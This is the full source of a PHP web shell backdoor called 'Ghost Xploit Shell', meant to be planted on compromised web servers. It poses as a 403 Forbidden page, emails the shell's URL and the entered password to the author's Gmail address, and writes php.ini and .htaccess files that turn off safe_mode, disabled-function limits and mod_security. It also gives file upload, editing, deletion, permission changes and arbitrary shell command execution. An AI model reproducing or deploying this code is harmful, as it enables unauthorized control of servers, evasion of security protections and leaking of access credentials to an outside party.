<?php
/*GHOST XPLOIT SHELL
AUTHOR SNIPER404
Copyright 2021-2022
Access site.com/shell.php?403=XPLOIT
Pass Default : Sadboy1337
*/

session_start();
error_reporting(0);
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

if(array_key_exists('watching',$_POST)){
$TO ='sniper404ghostxploit@gmail.com';
$x_path = "http://" .
$_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$PESAN = "LINK $x_path PASSWORD : [".$_POST['pass']."]";
@mail($TO, "SHELL BACKDOOR",$PESAN);
}

$x = "8d44ef8a56b85e7a0894c99fc50f55e2";
function Login() {

$HARAM=$_SERVER['REQUEST_URI'];

if(isset($_GET["XPLOIT"])){
?>
<html>
<head>
<title>Login Shell Backdoor</title>
<style type="text/css">
html {
	margin: 20px auto;
	background: #000000;
	color: lime;
	text-align: center;
}
header {
	color: lime;
	margin: 10px auto;
}
input[type=password] {
	width: 250px;
	height: 25px;
	color: lime;
	background: #000000;
	border: 1px solid lime;
	padding: 5px;
	margin-left: 20px;
	text-align: center;
}
</style>
</head>
<center>
<header>
	<pre>
 
<br><br><br><br><br><center><marquee behavior="alternate" scrollamount="20" style="border:1px solid;" width="70%"><font size="5px" color="lime">RESTRICTED AREA | SNIPER404 WAS HERE</font></marquee></center><br><br><br>
 

*-~'`^'*u_                                _u*'^`'~-*,
p!^       /  jPw                            w9j \        ^!p
w^.._      /      '\_                      _/'     \        _.^w
*_   /          \_       _    _      _/         \     _* 
q /           / \q   ( `---` )   p/ \          \   p
jj5****._    /    ^\_) o  o (_/^    \    _.****6jj
*_ /      '==) ;; (=='      \ _*
`/.w***,   /(    )\   ,***w.\'
^      ^c/ )    ( \c^      ^
'V')_)(_('V'
	</pre>
</header>


<br><br><br>
<form method=post><input type="password" name="pass" style='border: 1px dotted lime;'>
<button type=submit name='watching' style='height:0px; width:0px; border:none; background-color: black;'></button></form>

<?php

}else{
echo '<html><head><html><title> 403 Forbidden </title><h1>Forbidden</h1>';

echo "You don't have permission to access $HARAM";
echo  ' on this server';
echo '<br><br>';
echo 'Additionally, a 403 Forbidden error was encountered while trying to use an ErrorDocument to handle the request.';
echo ' </center>';
}
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
if( empty($x) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $x) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
else
Login();

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<html dir="auto" lang="en-US">
<head>
<meta charset="UTF-8">
<meta name="robots" content="noindex, nofollow">
<meta name="theme-color" content="#434343">
<link href="https://fonts.googleapis.com/css2?family=Metal+Mania&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
<link rel="icon" type="image/jpg" href="http://dokter-babi.xp3.biz/media/sniper-icon.png"/>
<style>
body{
font-family: Kelly Slab;
	background-image: url("https://raw.githubusercontent.com/Sniperxxx/web/main/memeque.jpg");
	color:#ffffff;
	background-attachment:fixed;
	background-repeat:no-repeat;
	background-position:center;
	background-color:black;
	-webkit-background-size: 100% 100%;
}
#content tr:hover{
background-color:#FF1493;
}
#content .first{
background-color:transparent;
}
.XPLOIT:hover {
background-color: transparent;
color:#009999;
}
.PEMALANG {
color: #ffffff;
font-size: 35px;
font-family: "Metal Mania", cursive;
text-shadow: 0px 2px 0px #ffffff;
}
table{
border: 3px white solid;
}
a{
color:white;
text-decoration: none;
}
a:hover{
color:#ffffff;
}
input,select,textarea{
color:white;
background:transparent;
border: 2px #ffffff solid;
-moz-border-radius: 4px;
-webkit-border-radius:4px;
border-radius:4px;
}
</style>
</head>
<body>
<center><span class="PEMALANG"><a href="?" class="XPLOIT">PEMALANG GHOST XPLOIT</a></span></center>
<table width="915" border="0" cellpadding="10" cellspacing="1" align="center">
<tr><td>';

// disable function
if (file_exists("php.ini")){
}else{
$img = fopen('php.ini', 'w');
$sec = "safe_mode = OFF
disable_funtions = NONE";
fwrite($img ,$sec);
fclose($img);}
if (file_exists(".htaccess")){
}else{
$img2 = fopen('.htaccess', 'w');
$sec2 = "<IfModule mod_security.c>
		SecFilterEngine Off
		SecFilterScanPOST Off
		</IfModule>";
fwrite($img2 ,$sec2);
fclose($img2);}
$inids = @ini_get("disable_functions");

echo "<tr><td>
# DISABLE <td>: <font color='lime'>".$liatds = (!empty($ds)) ?"<font color='#b200ff'>$inids</font>" : "<b><font color='lime'>SECURE</font></b>";

//info server
echo "<tr><td><font color='white'>
# YOUR IP    <td>: <font color='lime'>".$_SERVER['REMOTE_ADDR']."<tr><td><font color='white'>
# SERVER  <td>: <font color='lime'>".gethostbyname($_SERVER['HTTP_HOST'])."<tr><td><font color='white'>
# SYSTEM     <td>: <font color='lime'>".php_uname()."<tr><td><font color='white'>
# AUTHOR   <td>: <font color='lime'>SNIPER404<tr><td><font color='white'>
# CONTACTS  <td>: <font color='lime'>SNIPER404GHOSTXPLOIT@GMAIL.COM</font></tr></td><br>
</table>";
 
echo '<table width="95%" border="0" cellpadding="10" cellspacing="0" align="center">
<tr align="center"><td align="center"><br>';
 
//PATH
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<i class="fa fa-folder-o"></i> : <a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}

//UPLOAD
echo '<br></td></tr><tr><td><br>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<center><font color="lime">Upload Berhasil</font><br />';
}else{
echo '<br><center><font color="#ffffff">Upload gagal anjing</font><br/>';
}
}
echo '<br><center><form enctype="multipart/form-data" method="POST">
<font color="#ffffff"></font> <input type="file" name="file" />
<input type="submit" value="UPLOAD" />
</form><br>';

echo "<center><form method='post'>
<font color='#ffffff'></font>
<input type='text' size='29' height='15' name='cmd'><input type='submit' name='execmd' value='EXECUTE'>
</form><br>
</td></tr>";
if($_POST['execmd']) {
echo "<br><center><textarea cols='113' rows='10' readonly='readonly' style='color:#ffffff; background-color:transparent;'>".exe($_POST['cmd'])."</textarea></center>";
}

echo "<br></td></tr>";
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';


//CHMOD
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<br><font color="lime">CHANGE PERMISSION SUCCESS !!!<br></font><br/>';
}else{
echo '<script>alert("Change Permission Gagal !!")</script>';
}
}

echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" style="width:80px; height: 30px;"/>
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Lanjut" style="width:60px; height: 30px;"/>
</form>';
}

//RENAME FILE
elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<br><font color="lime">CHANGE NAME SUCCESS !!<br></font><br/>';
}else{
echo '<script>alert("Change Name Gagal !!")</script>';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="5" style="width:20%; height:30px;" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Lanjut" style="height:30px;" />
</form>';
}

//EDIT FILE
elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<br><font color="lime">EDIT FILE SUCCESS !!<br
></font><br/>';
}else{
echo '<script>alert("Edit File Gagal !!")</script>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols="113" rows="10" name="src" style="font-size: 8px; border: 2px solid white; background-color: transparent; color: white; width: 94%;height: 1000px;">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Lanjut" style="height:30px; width:70px;"/>
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';


//DELETE DIR
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<br><font color="lime">DELETE DIR SUCCESS !!!<br></font><br/>';
}else{
echo '<script>alert("Delete Dir Gagal !!")</script>>';
}
}                                                     

//DELETE FILE
elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<br><br><font color="lime">DELETE FILE SUCCESS !!</font><br/>';
}else{
echo '<script>alert("Delete File Gagal !!")</script>';
}
}
}

?>
<?php
echo '</center>';
$scandir = scandir($path);
$pa = getcwd();
echo '<div id="content"><table width="95%" class="table_home" border="1" cellpadding="10" cellspacing="1" align="center">
<tr class="first">
<th><center>Name</center></th>
<th><center>Size</center></th>
<th><center>Permission</center></th>
<th><center>Options</center></th>
</tr>
<tr>';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr>
<td class=td_home><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='><a href=\"?path=$path/$dir\"> $dir</a></td>
<td class=td_home><center>DIR</center></td>
<td class=td_home><center>";
if(is_writable("$path/$dir")) echo '<font color="#57FF00">';
elseif(!is_readable("$path/$dir")) echo '<font color="#FF0004">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td class=td_home><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href=\"?filesrc=$path/$file&path=$path\"> $file</a></td>
<td class=td_home><center>".$size."</center></td>
<td class=td_home><center>";
if(is_writable("$path/$file")) echo '<font color="#57FF00">';

echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<center><br/><font color="white">Pemalang Ghost Xploit</font><br>';

function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
//////all functions disini tempatnya/////
function exe($cmd) {
if(function_exists('system')) {
		@ob_start();
		@system($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	} elseif(function_exists('exec')) {
		@exec($cmd,$results);
		$buff = "";
		foreach($results as $result) {
			$buff .= $result;
		} return $buff;
	} elseif(function_exists('passthru')) {
		@ob_start();
		@passthru($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	} elseif(function_exists('shell_exec')) {
		$buff = @shell_exec($cmd);
		return $buff;
	}
}
?>
